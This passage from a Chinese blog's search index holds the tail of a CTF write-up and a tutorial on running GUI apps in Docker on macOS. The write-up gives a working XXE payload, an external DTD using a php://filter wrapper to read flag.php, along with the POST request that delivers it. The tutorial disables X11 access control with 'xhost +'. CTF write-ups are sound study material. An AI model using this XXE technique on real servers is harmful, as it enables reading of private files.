class="string">"&lt;!entity"</span>, <span class="string">"nonono"</span>, $xmlfile);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$xmlfile = <span class="string">'&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="string">&lt;!ENTITY all "'</span>.$xmlfile.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;all;&lt;/root&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT|LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> ($creds);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>提示信息：Flag 在 ./flag.php 中</strong></p><p>尝试直接访问 flag.php 发现内容为 flag{f4ke_fl4g} ，也就是假 Flag ；那么根据提示来分析，很有可能真正的 Flag 被写在 php 代码的注释中或是有 if 条件来限制，所以首要的目标是拿到 flag.php 的代码。</p><p>通过分析上面的代码，可以发现 else 中 xmlfile 被双引号扩住，所以不能通过写入 SYSTEM 关键字来达到 xxe 的效果，而 else if 中只要出现 xml 字样就会替换 entity 关键字，但没有进一步的过滤措施，故可以通过载入 dtd 的方式实现注入。</p><p><strong>题目本身是放在服务器上的，故想要访问自定义的 dtd 文件需要具备公网 ip 的设备，这里的复现因为在本地，就不做相关处理了</strong>。假设文件名为 tmp.dtd ，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;&gt;</span><br></pre></td></tr></table></figure><p>这里要注意的是，由于最后 php 解析的是 xml 内容，而 flag.php 代码中存在诸如 &lt;&gt; 的符号，会对解析造成干扰，故采用 php 伪协议将文件内容以 base64 进行编码。</p><p>然后通过 Python+Requests 发送如下 POST 请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"requests"</span>).post(<span class="string">"http://&lt;ip&gt;:&lt;port&gt;/&lt;题目文件名&gt;"</span>, data=&#123;<span class="string">"name"</span>:<span class="string">'&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root SYSTEM "tmp.dtd"&gt;&lt;root&gt;&amp;test;&lt;/root&gt;'</span>&#125;).content</span><br></pre></td></tr></table></figure><p>将得到的 base64 内容解码即可得到 php 代码，经过相关处理得到 Flag。</p><h2 id="0x23-ScriptBoy"><a href="#0x23-ScriptBoy" class="headerlink" title="0x23 ScriptBoy"></a>0x23 ScriptBoy</h2><p><a href="https://pan.baidu.com/s/1PtDSpJT8eXlDjw6voKYaig" target="_blank" rel="noopener">文件包</a> 提取码: gxfa</p><p><strong>题目描述：筛选出所有文件中前两个数字都是4位的一行，将选出的每一行的第20位组成一个字符串， flag就是这个字符串的32位小写MD5的值</strong></p><p>分析文件结构后可以用如下脚本构造 Flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">filename = <span class="string">"./"</span>+str(i)+<span class="string">"/"</span>+str(i)+<span class="string">".txt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">content = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> content:</span><br><span class="line">split_tmp = tmp.split(<span class="string">'----'</span>)</span><br><span class="line"><span class="keyword">if</span> len(split_tmp[<span class="number">0</span>])==len(split_tmp[<span class="number">1</span>])==<span class="number">4</span>:</span><br><span class="line">result.append(tmp[<span class="number">19</span>])</span><br><span class="line"></span><br><span class="line">print(md5(<span class="string">''</span>.join(result).encode(<span class="string">'utf8'</span>)).hexdigest())</span><br></pre></td></tr></table></figure><h2 id="0x24-ljmisc"><a href="#0x24-ljmisc" class="headerlink" title="0x24 ljmisc"></a>0x24 ljmisc</h2><p><a href="https://pan.baidu.com/s/1IJ_pA4EL53YvZChEyXsFwQ" target="_blank" rel="noopener">图片</a> 提取码: mnck</p><p>⬆️打开链接前请做好心理准备</p><p>拿到图片后，执行 <code>binwalk 1000.png</code> 即可发现从 0x8B3F4 处开始隐藏了一个压缩包，故可执行 <code>dd if=1000.png of=test.zip skip=0x8b3f4 bs=1</code> 来将它提取出来。据说这个包经过了伪加密，但是当时因为环境是 MacOS ，所以也没有经历解密的操作，这里也就先不记录相关内容了。</p><p>打开后出现一个新的压缩包和两张图片，新的压缩包是真的被加密过的，所以要从另外两张图片寻找解压密码的线索。</p><p>两张图片并不能看出什么分别，但是大小却差了很多，故可以猜测是盲水印。</p><p>使用<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">bwm</a>处理后可以获得解压密码为 glgjssy_qyhfbqz，输入后即可打开压缩包到达第三层。</p><p>解压后的文件是一个充满0和1的文件，当时看了好久都没什么头绪。但是在我万能的舍友的帮助下，猜测这可能是描述了一张二维码，故通过以下脚本将1的位置填充为黑，0的位置填充为白：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(MAX, MAX))</span><br><span class="line"></span><br><span class="line">str = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./bin.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">str = f.read()</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">'1'</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><p>扫描二维码即可获取 Flag。</p><h1 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h1><p>本文记录了本次招新赛中的部分题目，其他的题目因为难以复现而暂时无法记录。</p><p>技术上的话题就到此为止了，下面是一些题外话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5Zug5Li65piv56ys5LiA5qyh5YGaIGN0Zu+8jOaJgOS7peinieW+l+aXoOiuuuWmguS9lemDveimgeWGmeS4gOS6m+S4nOilv++8jOWPr+iDveaYr+S9nOS4uuaWsOaWueWQkeeahOi1t+eCue+8jOS5n+WPr+iDveaYr+S4uuS6huaWueS+v+aXpeWQjueahOWbnuW/huOAggoK5pyA6L+R6YGH5Yiw5LqG5ZCE56eN5LqL5oOF77yM55Sx5q2k5Lmf5oOz5LqG5b6I5aSa44CC5bCx5Zyo5LiK5Liq5a2m5pyf77yM5oiR5Zug5Li65b2T5pe255y85YWJ5q+U6L6D55+t5rWF6ICM5ouS57ud5LqG5LiA5Liq5py65Lya77yM5rKh5oOz5Yiw6L+Z5a2m5pyf5Y205Zug5q2k6ZSZ6L+H5LqG5b6I5aSa5LqL5oOF44CC5a+55LqO6L+Z5Lu25LqL77yM6K+05LiN5ZCO5oKU5piv5LiN5Y+v6IO955qE77yM5L2G5oiR5Y+I5LiN5piv5LiA5Liq5Lya55So6L+H5Y675Y+N5aSN5oqY56Oo6Ieq5bex55qE5Lq677yM6YCJ6ZSZ5LqG5bCx5piv6YCJ6ZSZ5LqG77yM5Lmf5rKh5LuA5LmI5aW96K+055qE44CCCgrog73lpJ/ov5vlhaUgTkVYIOaYr+aIkeayoeacieaDs+WIsOeahO+8jOi/meS5n+iuuOaYr+WPpuS4gOS4quacuuS8muOAguS4jeeuoeaAjuS5iOivtO+8jOWug+S7juWPpuS4gOS4quWxgumdouiuqeaIkeeci+WIsOS6huW+iOWkmuS4nOilv++8jOi/meS+v+Wkn+S6huOAggoK6LCo5Lul5q2k5paH6K2m6YaS5pyq5p2l55qE6Ieq5bex44CC</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在 Docker for MacOS 中运行 GUI 程序</title>
      <link href="/2019/10/14/Run-GUI-in-Docker/"/>
      <url>/2019/10/14/Run-GUI-in-Docker/</url>
      
        <content type="html"><![CDATA[<p>内容包括：前言+环境+具体操作+原理</p><a id="more"></a><h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>在初步接触了 Docker 后，突然萌生了一个“可不可以在其中跑GUI程序的念头”，遂急忙STFW&amp;&amp;RTFM，并在查阅了相关的一些文档后，成功在本地运行了容器内的GUI测试程序，下面记录一下相关的工作和原理。</p><h1 id="0x1-相关环境"><a href="#0x1-相关环境" class="headerlink" title="0x1 相关环境"></a>0x1 相关环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Docker version 18.09.2</span><br><span class="line">XQuartz 2.7.11（xorg-server 1.18.4)</span><br></pre></td></tr></table></figure><p>以上软件均可通过 <a href="https://brew.sh" target="_blank" rel="noopener">homebrew</a> 进行安装</p><h1 id="0x2-具体操作"><a href="#0x2-具体操作" class="headerlink" title="0x2 具体操作"></a>0x2 具体操作</h1><ol><li>XQuartz -&gt; 偏好设置 -&gt; 安全性 -&gt; 勾选“允许从网络客户端连接” -&gt; 退出程序；</li><li>终端键入 <code>xhost +</code>（注意两者之间的空格）重新启动 XQuartz；</li><li>使用诸如 <code>nmap</code> 类的工具查看 6000 端口是否被 X11 服务占用，如果已经被占用即可继续下一步操作，如果没有被占用的话…因为没遇到过所以我也不知道怎么办:-P；</li><li>在 run 或 exec 容器时加入<code>-e DISPLAY=host.docker.internal:0</code>参数，比如我这里通过对一个现有的，已经安装过 xarclock 时钟小程序的容器 toyOS 执行<code>docker exec -ite DISPLAY=host.docker.internal:0 toyOS /usr/bin/xarclock</code>，就会在我的本地出现一个小时钟的GUI程序；</li></ol><h1 id="0x3-相关原理"><a href="#0x3-相关原理" class="headerlink" title="0x3 相关原理"></a>0x3 相关原理</h1><p>在 Linux 系统及一些 Unix-like 系统中，有着 <a href="http://linfo.org/x.html" target="_blank" rel="noopener">X Window System</a> 的概念（下面简称为 X系统），用户的 GUI 程序作为 X Client 向本地或远程的 X Server 交互，以得到底层的支持来在运行 X Server 的设备上绘制出图像，而 <a href="https://www.xquartz.org" target="_blank" rel="noopener">XQuartz</a> 则是一款面向 MacOS 系统的 X系统，（在我理解的层面上）也提供了如上的功能支持。</p><p>于是在这个原理的支撑下，<strong>如何让 Docker 运行 GUI 程序</strong> 这个问题就被转化成了 <strong>如何在宿主机运行 X Server</strong> 以及 <strong>如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互</strong>，下面分别来解决这两个问题：</p><h2 id="0x31-如何在宿主机运行-X-Server"><a href="#0x31-如何在宿主机运行-X-Server" class="headerlink" title="0x31 如何在宿主机运行 X Server"></a>0x31 如何在宿主机运行 X Server</h2><p>在 X系统的定义中可以看到，本身该系统就可以支持以网络为基础的 C-S 模型（虽然关注点更倾向于服务方），XQuartz 作为它的一种实现当然也不例外。但是出于<a href="https://security.stackexchange.com/questions/14815/security-concerns-with-x11-forwarding" target="_blank" rel="noopener">安全上的考虑</a>，XQuartz 默认是不允许通过网络进行交互的。要关闭这个限制，有两个方面要实现，分别对应 <strong>具体操作</strong> 中的1，2两个操作，第一个操作就像字面上的意思一样，关闭了网络连接限制，第二个操作则是关闭了连接鉴定（access control），可以通过运行 <code>man xhost</code> 来查看其 Man Page 以获得更多的信息。需要注意的是，因为本次实验的操作都是在本地实现的，所以完全关闭了连接鉴定，这在涉及到远程操作时是非常不安全的。</p><p>执行了上述步骤且 6000 端口被监听（默认情况）时，我们就成功在宿主机上运行起了 X Server，接下来就要解决第三个问题了。</p><h2 id="0x32-如何让-Docker-中的-X-Client-与宿主机的-X-Server-实现交互"><a href="#0x32-如何让-Docker-中的-X-Client-与宿主机的-X-Server-实现交互" class="headerlink" title="0x32 如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互"></a>0x32 如何让 Docker 中的 X Client  与宿主机的 X Server 实现交互</h2><p>作为 X Client 的程序如果想与 X Server 进行交互，大致分为两种方式：</p><ul><li>在命令后加 <code>--display</code> 参数并指明相关的位置</li><li>用户提前设置好环境变量 <code>DISPLAY</code> ，程序从该变量获得相关信息</li></ul><p>这里我们采用第二种方式，故在启动容器时通过 <code>-e</code> 参数为其设置 <code>DISPLAY</code> 变量，现在的问题在于，如何解释变量的值 <code>host.docker.internal:0</code> 呢？</p><p>对于该变量中，冒号前面的部分，<a href="https://docs.docker.com/docker-for-windows/networking/" target="_blank" rel="noopener">Docker 官方文档</a>中有如下解释：</p><blockquote><p>The host has a changing IP address (or none if you have no network access). From 18.03 onwards our recommendation is to connect to the special DNS name <code>host.docker.internal</code>, which resolves to the internal IP address used by the host. </p></blockquote><p>也就是说，这个值本质上是获得了宿主机的内部IP，为了验证这一点，可以通过 <code>ifconfig</code> 命令来查看宿主机实际的IP，并将 <code>DISPLAY</code> 的值换成 <code>your_ip:0</code> ，可以发现和前面一样可以运行。之所以本次实验采用了前者，是因为要获取实际IP，第一是过程很麻烦，第二是设备要处于联网的状态下，而在文档的描述中可以看到 <code>(or none if you have no network access)</code> 这句话，也就是说，这种参数设置在无网络的条件下也可以正常运行。</p><p>那么 <code>DISPLAY</code> 的值就可以被解释为 <code>your_ip:0</code> 了，关于这个格式，其实它的完整形式为 <code>your_ip: display_number. screen_number</code> ，在本实验中其实可以写为 <code>host.docker.internal:0.0</code>，<code>display_number</code> 和 <code>screen_number</code> 均从0开始计数，前者表示一个输入流的标号（输入流包括显示器，键盘，鼠标等），后者表示输入流中某个具体的显示屏，因为很少有人使用多屏幕，所以 <code>screen_number</code> 多数情况下均为0，也就可以省略掉了。</p><p>而对于 <code>display_number</code>，<a href="https://www.x.org/releases/X11R7.7/doc/xproto/x11protocol.html" target="_blank" rel="noopener">X11 protocol 官方文档</a>中有如下描述：</p><blockquote><p>For TCP connections, displays on a given host are numbered starting from 0, and the server for display N listens and accepts connections on port 6000 + N.</p></blockquote><p>也就是说，这个值实际上取决于宿主机上 X11 服务占用的端口，用端口号减掉6000即可，这就是上述命令中冒号后面的0的具体含义。为了验证这一点，可以使用 <code>socat</code> 工具运行 <code>socat tcp-listen:6100,reuseaddr,fork tcp:localhost:6000</code> 命令，将6100端口的消息转交给6000端口，这样按照上面的描述，<code>DISPLAY</code> 变量的值就可以为 <code>host.docker.internal:100</code> ，替换后执行完整命令，可以发现一样能运行GUI测试程序。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
